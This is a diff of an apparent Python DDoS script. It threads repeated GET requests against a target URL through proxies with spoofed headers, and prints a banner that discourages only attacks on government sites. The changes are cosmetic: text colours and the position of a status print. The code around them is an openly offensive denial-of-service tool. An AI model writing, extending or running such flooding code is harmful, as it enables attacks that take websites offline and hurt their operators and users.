@@ -12,9 +12,9 @@ from fake_headers import Headers
 import time
 
 os.system("clear")
-print("\033[32mSHOULD NOT BE USED TO ATTACK GOVERNMENT SITES")
+print("\033[37mSHOULD NOT BE USED TO ATTACK GOVERNMENT SITES")
 time.sleep(5)
-print("\033[32mLoading.......")
+print("\033[37mLoading.......")
 time.sleep(5)
 
 attemps = 0
@@ -72,7 +72,6 @@ def check(ip, prox, url):
 		thread_list = []
 		t = threading.Thread (target=ddos, args=(prox, url))
 		thread_list.append(t)
-		print("\033[104m\033[37m" +str(url)+ "\033[33mProssecing 0n")
 		t.start()
 
 def ddos(prox, url):
@@ -92,6 +91,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
 			print(color+"{}".format(prox))
+			print("\033[104m\033[37m" +str(url)+ "\033[33mProssecing 0n")
 	except:
 		pass
 
